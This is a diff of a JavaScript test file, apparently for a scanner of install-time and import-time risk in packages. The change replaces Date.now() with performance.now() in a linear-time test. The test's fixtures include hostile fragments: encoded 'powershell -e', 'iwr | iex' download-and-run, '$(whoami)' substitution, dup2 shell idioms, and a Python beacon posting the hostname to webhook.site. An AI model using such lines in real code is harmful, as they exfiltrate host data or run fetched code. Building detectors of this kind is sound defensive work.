@@ -277,19 +277,19 @@ test("the environment held or copied, read by a member's name (D-16); a JSON fil
 test("linear time on hostile texts", () => {
   for (const text of ["powershell ".repeat(50_000), "powershell -e " + "A".repeat(400_000), "'".repeat(200_000) + "exec http",
     "dup2(".repeat(100_000), "$(whoami)".repeat(50_000), "iwr ".repeat(100_000) + "| iex"]) {
-    const t0 = Date.now();
+    const t0 = performance.now();
     installScriptRisk(text);
     importTimeRisk(text);
-    assert.ok(Date.now() - t0 < 10_000, text.slice(0, 20));
+    assert.ok(performance.now() - t0 < 10_000, text.slice(0, 20));
   }
   const beacon = "import requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n";
   for (const tail of [" ".repeat(200_000) + "'a' ".repeat(50_000), "x = 1; " + "'a'; ".repeat(60_000), "#\n".repeat(100_000),
     '"""\n'.repeat(50_000), "(".repeat(100_000) + "'a'\n".repeat(20_000), "\\\n'a'\n".repeat(40_000),
     "powershell ".repeat(50_000) + "os.system(".repeat(1000)]) {
     for (const lang of ["py", "js"]) {
-      const t0 = Date.now();
+      const t0 = performance.now();
       assert.ok(importTimeRisk(beacon + tail, lang)[0].length);
-      assert.ok(Date.now() - t0 < 10_000, `${tail.slice(0, 20)} ${lang}`);
+      assert.ok(performance.now() - t0 < 10_000, `${tail.slice(0, 20)} ${lang}`);
     }
   }
 });
